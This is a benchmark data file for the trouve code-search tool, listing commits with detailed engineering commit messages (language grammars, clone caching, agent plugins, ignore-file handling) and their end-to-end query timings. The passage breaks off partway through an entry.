window.BENCHMARK_DATA = {
  "lastUpdate": 1784680268692,
  "repoUrl": "https://github.com/jimsimon/trouve",
  "entries": {
    "e2e-benchmarks": [
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c54a63d163682009cd91a59851bd623c93a9f52a",
          "message": "Benchmark git vs non-git roots; gate CI on benchmark regressions (#1)\n\n* Benchmark git vs non-git roots on kubernetes\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Guard TOUCH_REL pipeline against SIGPIPE under pipefail\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Update git vs non-git numbers to committed-script run\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate CI on benchmark regressions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix racy shared model dir in embed parity tests\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Persist benchmark data to gh-pages instead of the actions cache\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review: harden bench scripts and workflow\n\n- Resolve caller-supplied repo paths before cd; error instead of cloning over a missing user path\n- Shell-escape all values interpolated into hyperfine command strings; drop eval in favor of direct invocations\n- Restore the incremental-scenario file via EXIT trap so failures leave the tree clean\n- Recursive criterion glob (grouped/parameterized bench IDs) and a loud duplicate-name guard in the converter\n- SHA-pin all actions, set persist-credentials: false on checkouts\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:51:39-04:00",
          "tree_id": "099ec6b183f6cb426cc60fe16491d57ba3cdda2a",
          "url": "https://github.com/jimsimon/trouve/commit/c54a63d163682009cd91a59851bd623c93a9f52a"
        },
        "date": 1783101231400,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 117.3390725,
            "range": "± 8.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.690117480000005,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 68.84425028000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.074566960000006,
            "range": "± 1.0",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "22d3e560019dc5635491b0b20caf7c55b621f2b1",
          "message": "Add tree-sitter grammars for 23 more languages (#5)\n\nBundle maintained crates.io grammars for CMake, D, Dart, Elm, ERB/EJS\ntemplates, Erlang, Fortran, Gleam, GraphQL, Groovy, HCL/Terraform,\nJulia, Make, Nix, Objective-C, Perl, PowerShell, Protocol Buffers, R,\nSolidity, SQL, Svelte, and XML (incl. DTD), bringing syntax-aware\nchunking to ~50 languages. Document the native language list and the\nline-based fallback tiers in the README.\n\nConsidered but excluded: tree-sitter-clojure (pins tree-sitter 0.25,\nconflicts with 0.26) and tree-sitter-dockerfile (pins tree-sitter 0.20).\n\nStripped x86_64 Linux release binary grows 50.9 MB -> 83.7 MB\n(gzipped: 7.5 MB -> 10.1 MB), dominated by the Fortran, Julia,\nObjective-C, and D parser tables.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:53:25-04:00",
          "tree_id": "aa7d8e8413c072d49db8b39aba53029798d7fba4",
          "url": "https://github.com/jimsimon/trouve/commit/22d3e560019dc5635491b0b20caf7c55b621f2b1"
        },
        "date": 1783101389139,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 118.07405020000002,
            "range": "± 8.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 57.729071319999996,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 68.33090696000001,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.008611140000006,
            "range": "± 1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7117bbc09c7dc497bac1c19bffd1d206b5411395",
          "message": "Fix new stable clippy lint manual_is_multiple_of (#3)\n\n* Fix new stable clippy lint manual_is_multiple_of\n\nCurrent stable clippy (-D warnings in lint CI) flags the manual modulo\nchecks in embed.rs and tests/embed_parity.rs. Use usize::is_multiple_of\nand raise the advertised MSRV to 1.87, where it was stabilized.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Remove clone_cache.rs committed by mistake\n\nThe file belongs to the separate clone-caching branch; it was untracked\nand slipped into the previous commit via git add -A.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:55:24-04:00",
          "tree_id": "0ea316d52639cfd8ec54abe1489580c9c927c3eb",
          "url": "https://github.com/jimsimon/trouve/commit/7117bbc09c7dc497bac1c19bffd1d206b5411395"
        },
        "date": 1783101517085,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 122.62990428,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.91164150000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 69.04898406,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.970883900000004,
            "range": "± 0.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c941ab5bb6338796215d329e0389cbee2a09852b",
          "message": "Update LICENSE copyright holder to James Simon (#13)\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T15:03:48-04:00",
          "tree_id": "71414dea1f4009dd7ff10bb72b0ab2f69d867881",
          "url": "https://github.com/jimsimon/trouve/commit/c941ab5bb6338796215d329e0389cbee2a09852b"
        },
        "date": 1783105521579,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 120.06920018000001,
            "range": "± 4.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.48141726,
            "range": "± 2.2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 70.33421738000001,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 59.79942134000001,
            "range": "± 1.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "01d6d607afdfba9532dfc392fa8ff390f1703010",
          "message": "Add trouve-native config names with deprecated semble fallbacks (#14)\n\n- .trouveignore is now honoured per directory (same gitignore semantics),\n  taking precedence over the deprecated .sembleignore where patterns\n  conflict; .sembleignore still works but logs a one-time deprecation\n  warning pointing at .trouveignore.\n- SEMBLE_CACHE_LOCATION, SEMBLE_MODEL_NAME, and SEMBLE_CLONE_TIMEOUT are\n  honoured as fallbacks when the TROUVE_* equivalent is unset, with the\n  same one-time deprecation warning.\n- .semble/ directories are skipped during walks alongside .trouve/,\n  matching upstream's default ignore list.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T16:46:36-04:00",
          "tree_id": "77de7c46fec7e1fb22775691563517390b8f6154",
          "url": "https://github.com/jimsimon/trouve/commit/01d6d607afdfba9532dfc392fa8ff390f1703010"
        },
        "date": 1783111670646,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 117.79910108,
            "range": "± 9.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 57.135625100000006,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 67.80243886000001,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 56.297090620000006,
            "range": "± 1.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "93ea488b5d6edce49a23796bb4f7286707ef6472",
          "message": "Consolidate all agent plugins into one trouve-plugin package (#12)\n\n* Consolidate all agent plugins into one trouve-plugin package\n\nplugins/trouve is simultaneously the npm package trouve-plugin for\nOpenCode and Kilo Code (native tools backed by one persistent trouve\nstdio server per session), the Claude Code plugin bundle (MCP server,\nsub-agent, workflow skill, SessionStart index-warming hook; marketplace\nat .claude-plugin/marketplace.json), and the Codex plugin bundle (MCP\nserver + skill; marketplace at .agents/plugins/marketplace.json).\n\nThe OpenCode/Kilo plugin warms the project index at load and on\nsession.idle (throttled; warm:false disables). README gains an Agent\nintegrations feature grid comparing every install route.\n\nRebased onto main as a single commit, folding in all review fixes.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review: request timeouts, stderr capture, visible failures\n\n- request() now takes a per-request timeout (30s for the initialize\n  handshake, 10 minutes for tools/call to cover cold index builds of\n  huge repos). On timeout the pending request is rejected with an\n  actionable message and the server is killed so the next call starts\n  fresh — a stalled-but-alive server can no longer hang an agent turn.\n- The server's stderr is captured (last 2KB) and included in the\n  rejection message when the process exits unexpectedly.\n- The Claude SessionStart hook now fails visibly with an install hint\n  when the trouve binary is missing, instead of masking it with exit 0;\n  the warm itself still runs backgrounded via nohup.\n- Invalid content plugin-option values are reported via console.warn\n  instead of being silently dropped.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T17:21:03-04:00",
          "tree_id": "06ce1231852c1c9a4feede5fe15470ec8978f9f6",
          "url": "https://github.com/jimsimon/trouve/commit/93ea488b5d6edce49a23796bb4f7286707ef6472"
        },
        "date": 1783113744197,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 123.25124344000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 59.95674306000001,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 69.85672328000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 58.375656920000004,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "bb36045e50014ccd97a4e394d3552b90cb557f5c",
          "message": "Keep crate, plugin, and package versions in sync — enforced in CI and releases (#11)\n\nscripts/sync_versions.py treats the crate version in Cargo.toml\n(parsed with tomllib) as the single source of truth and rewrites every\npublished manifest to match: plugins/*/package.json, package-lock.json\n(both version records), and Claude Code / Codex plugin.json manifests.\nLint CI runs it with --check so any drift fails the build.\n\nThe release workflow gains a verify-versions job (sync check + tag ==\ncrate version assertion, before any build) and a publish-npm job that\npublishes every plugins/*/package.json package at the same version\nafter the GitHub release — idempotent, and skipped cleanly when no npm\npackages exist or NPM_TOKEN is not configured. New checkout steps set\npersist-credentials: false.\n\nWith the unified plugin (#12) on main, the sync check now covers\nplugins/trouve. Rebased onto main as a single commit with all review\nfixes.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T17:38:25-04:00",
          "tree_id": "8f1adfb5bd3765e3db2792f5b4cd9abda4d2b44f",
          "url": "https://github.com/jimsimon/trouve/commit/bb36045e50014ccd97a4e394d3552b90cb557f5c"
        },
        "date": 1783114785817,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 116.92929120000001,
            "range": "± 5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 57.500692560000005,
            "range": "± 2.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 67.6127314,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 56.352596240000004,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "6b52916408d70e9c364e43cb3e7933573b43ccad",
          "message": "Cache shallow clones of remote repositories persistently (#4)\n\n* Cache shallow clones of remote repositories persistently\n\nfrom_git used to clone into a throwaway temp directory on every call,\nmaking the network-bound clone the dominant repeated cost of querying a\nremote repo (chunks and embeddings were already cached by the store).\n\nClones now persist under <cache>/clones keyed by URL (and optional\nref): refreshed via git fetch --depth 1 + hard reset at most once per\nfreshness window (TROUVE_CLONE_TTL seconds, default 300; the stamp\nadvances even on failed fetches so unreachable remotes are retried once\nper window), guarded by advisory file locks held for the whole index\nbuild, with stale clones served (with a warning) when the remote is\nunreachable. Idle clones and orphaned partials are evicted after a\nweek; trouve clear index reclaims per key while honouring locks and\nreports skipped in-use clones. Refs pass after --end-of-options.\n\nThe MCP server now re-validates git URLs after the same cooldown as\nlocal paths. Clone timeout honours the deprecated SEMBLE_CLONE_TIMEOUT\nfallback. MSRV rises to 1.89 for std file locking.\n\nRebased onto main (post-#12) as a single commit with all review fixes.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Retrigger review of the rebased head\n\nCodeRabbit's rate limiter skipped the review of the previous push;\nall feedback from its last review round is addressed in that commit\n(clear_clones honours locks, failed refreshes advance the TTL stamp,\nchangelog conflict markers removed, test isolated to its own clone).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T18:11:53-04:00",
          "tree_id": "c2f2c758dfec558d69085f35c7e8466d9e7d10b0",
          "url": "https://github.com/jimsimon/trouve/commit/6b52916408d70e9c364e43cb3e7933573b43ccad"
        },
        "date": 1783116794755,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 120.89273136000001,
            "range": "± 8.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 61.346233659999996,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 72.709371,
            "range": "± 0.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 61.28082774,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "134c8e48abbdbec99793f0c76e327ed03cf5cd60",
          "message": "Add native OpenCode custom tools as an opt-in alternative to MCP (#6)\n\ntrouve install gains a fourth, opt-in integration (\"Native tool\")\nthat writes ~/.config/opencode/tools/trouve.ts: exports surface to the\nmodel as trouve_search and trouve_find_related, run the trouve CLI via\nBun.spawn with a 10-minute watchdog (SIGTERM, then SIGKILL after 5s)\nand a catch on the stream await so every failure path returns tool\noutput, default repo to the session worktree, and support a content\nargument. MCP remains the default integration and is never touched by\nthe tool file; instruction blocks render whichever tool names the\nselected integrations expose. Documented in the README's Agent\nintegrations grid.\n\nRebased onto main (post-#4/#11) as a single commit with all review\nfixes.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T18:21:46-04:00",
          "tree_id": "2e99cc8b211f50fd466ffb86c3ae3f15c336ee77",
          "url": "https://github.com/jimsimon/trouve/commit/134c8e48abbdbec99793f0c76e327ed03cf5cd60"
        },
        "date": 1783117378958,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 121.01258385999999,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 59.2790148,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 68.65951584,
            "range": "± 0.9",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 56.927228420000006,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3ffd6848b3649fe9c20668def17396487e7ad869",
          "message": "Validate store parameters on snapshot open; verify existing files in save (#16)\n\nThe patch fast path opens the newest compatible snapshot regardless of\nmanifest hash (open_latest), but only validated SNAPSHOT_VERSION,\nmodel_id, and content types. STORE_VERSION and DESIRED_CHUNK_LENGTH are\nmixed into the manifest hash (so exact-match loads were safe) but were\nnot recorded in the snapshot itself — a future STORE_VERSION bump\nwithout a matching SNAPSHOT_VERSION bump would have silently spliced\nrows chunked under the old rules into patched indexes, breaking the\npatched-equals-full-rebuild guarantee.\n\nRecord store_version and chunk_len in SnapshotMeta and reject\nmismatches in RawSnapshot::open. Bump the snapshot format to v4\n(SMBLSNP4) since the meta layout changed; old snapshots are discarded\non magic mismatch and rebuilt.\n\nAlso fix save()'s early exit: the snapshot filename truncates the\nmanifest hash to 128 bits, and save() trusted any pre-existing file at\nthat path without verifying its embedded full hash — a partial or\nforeign file would be kept forever and miss on every load. Verify the\nexisting file and rewrite it if it is not actually this snapshot.\n\nThe module doc still described the v2 magic; it now matches the code.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T20:14:54-04:00",
          "tree_id": "aa2fd2a41ad500b180574b14dcf106846ca7b565",
          "url": "https://github.com/jimsimon/trouve/commit/3ffd6848b3649fe9c20668def17396487e7ad869"
        },
        "date": 1783124169285,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 123.83666352000002,
            "range": "± 11.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 61.753597860000006,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 73.96610446,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 60.8970364,
            "range": "± 1.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "600ffaa2e2445d200c7048ae841b2093619dfdb2",
          "message": "Report snapshot reuse separately and add the documented cache hit rate (#19)\n\nBuildStats.files_from_store counted every non-recomputed file,\nincluding rows spliced zero-copy out of a previous snapshot — after a\npatch build the stats implied store reads that never happened, and the\nexact-match snapshot load reported the whole manifest as store hits.\nTrack files_from_snapshot separately and only count real store reads\nin files_from_store.\n\nThe stats subcommand help, README, and DIFFERENCES.md all promised a\ncache hit rate that the output never included; trouve stats now emits\ncache_hit_rate (files reused from any cache layer over files_total)\nalongside the per-layer counts.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T20:15:20-04:00",
          "tree_id": "4651f6562da6d13513c1e11e24fcf6b6b588ec85",
          "url": "https://github.com/jimsimon/trouve/commit/600ffaa2e2445d200c7048ae841b2093619dfdb2"
        },
        "date": 1783124299698,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 115.83488864,
            "range": "± 7.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.6285584,
            "range": "± 0.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 70.10730076,
            "range": "± 0.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.67109850000001,
            "range": "± 2.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "81f99b6338ff3eed4521065ee09c7d80d040741e",
          "message": "Docs cleanup: fix inaccuracies found in review (#23)\n\n- README: Go was fully wired (tree-sitter-go dependency and chunk.rs\n  match arm) but missing from the natively-supported language table.\n- README: the cache-location section paired SEMBLE_CLONE_TIMEOUT with\n  TROUVE_CLONE_TTL, but the TTL is trouve-only; the actual pair is\n  TROUVE_CLONE_TIMEOUT (git network timeout, default 60s), which was\n  undocumented. Document both correctly.\n- CHANGELOG: the 1.0.0 installer entry said eleven coding agents; there\n  are 14 (matching the README).\n- BENCHMARKS: the kubernetes warm-query time appeared as both 0.55s and\n  0.54s; use the headline 0.55s consistently.\n- plugin README: the Claude Code section listed raw MCP tool names\n  while Codex showed the harness-prefixed ones; Claude Code also\n  prefixes (mcp__trouve__*).\n- SearchResult/search module docs now state that reranking changes the\n  score scale, so scores are only comparable within one result list.\n- bm25.rs module doc now notes production indexing tokenizes content\n  and path enrichment separately (index::path_enrichment_tokens) and\n  keeps enrich_for_bm25 as the upstream-reference form.\n- manifest.rs documents the mtime+size fast-path staleness caveat for\n  non-git roots (same trade-off as git's stat-based detection).\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T21:29:10-04:00",
          "tree_id": "8fb7a48d27a0c8e395dbdd851e9d94168ed0ff78",
          "url": "https://github.com/jimsimon/trouve/commit/81f99b6338ff3eed4521065ee09c7d80d040741e"
        },
        "date": 1783128625402,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 124.91506824,
            "range": "± 6.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 59.50724926000001,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 70.64415818,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.94205618,
            "range": "± 1.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "4531a5660d5457b4b8379a1de306b0a15b1132da",
          "message": "Honor .trouveignore in git repositories (#15)\n\n* Honor .trouveignore in git repositories\n\n.trouveignore (and the deprecated .sembleignore) were only consulted by\nthe directory walker, which is used for non-git roots. Git repositories\nbuild their manifest from git ls-files / git status, so the documented\n'exclude from indexing without git-ignoring' behaviour silently did\nnothing in the primary use case.\n\nApply .trouveignore rules (per-directory, gitignore semantics, deepest\nmatch wins) on top of the git file listing, for tracked and untracked\nfiles alike. .gitignore is intentionally not re-applied there: git\nitself decides what is tracked or untracked.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Apply .trouveignore before hashing to avoid wasted I/O\n\nReview feedback: the filter previously ran after dirty tracked files\nand untracked files had already been read and hashed, so excluded\nfiles (e.g. a large generated tree) paid full I/O before being\ndropped. Check the ignore rules in the tracked-file loop before the\ndirty-hash, and pre-filter the untracked list sequentially before the\nparallel hash step (TrouveIgnore caches specs behind &mut self, so it\ncannot be shared across the par_iter).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T21:29:49-04:00",
          "tree_id": "3464dcaf1ad2c48de4a0f5f5c3dff259528ae412",
          "url": "https://github.com/jimsimon/trouve/commit/4531a5660d5457b4b8379a1de306b0a15b1132da"
        },
        "date": 1783128762798,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 116.1369157,
            "range": "± 4.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 59.54609442,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 70.79154524,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 58.29827754000001,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "febd208234caa0db7d972b61cbac0e00b2627403",
          "message": "Handle tracked symlinks and merge conflicts in the git manifest (#17)\n\n* Handle tracked symlinks and merge conflicts in the git manifest\n\nTracked symlinks were keyed by their git blob OID — the hash of the\nlink target *path* — while indexing read straight through the link and\nchunked the target file's content. The store entry would then serve\nstale content whenever the target changed without the link itself\nbecoming dirty. Skip symlinks (mode 120000) like the walker and the\nuntracked path already do, and guard the dirty-file branch against\ntracked files replaced by symlinks in the working tree (typechange).\n\nUnmerged paths appear in git ls-files -s with stage-1/2/3 entries;\nthe first stage listed used to win arbitrarily when the path escaped\nthe dirty set. Treat any stage > 0 as dirty and hash the working tree,\nwhich is what search results would show.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix unmerged-paths test on CI runners without a git identity\n\ngit merge refuses to start when no committer identity is configured\n(CI runners have no global git config), so the test's merge never\ncreated stage-1/2/3 entries and the file stayed a clean stage-0 blob,\nfailing the b3: content-key assertion. Set the identity env vars like\nthe git() helper does, and assert the conflict precondition explicitly\nso an environment problem fails with a clear message.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Extract git_command test helper to deduplicate identity env setup\n\nReview feedback: the merge invocation duplicated the identity env\nvars already set in the git() helper. Both now build on a shared\ngit_command helper.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T22:38:07-04:00",
          "tree_id": "3acb0e7ae7b5d656f70e188f5a2d7f18c7d868c9",
          "url": "https://github.com/jimsimon/trouve/commit/febd208234caa0db7d972b61cbac0e00b2627403"
        },
        "date": 1783132758051,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 121.52511140000001,
            "range": "± 0.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.496795240000004,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 71.43863092,
            "range": "± 2.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.15448074,
            "range": "± 1.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5ba3b9f376a370459e2cfc5e034ebb384b86c0ce",
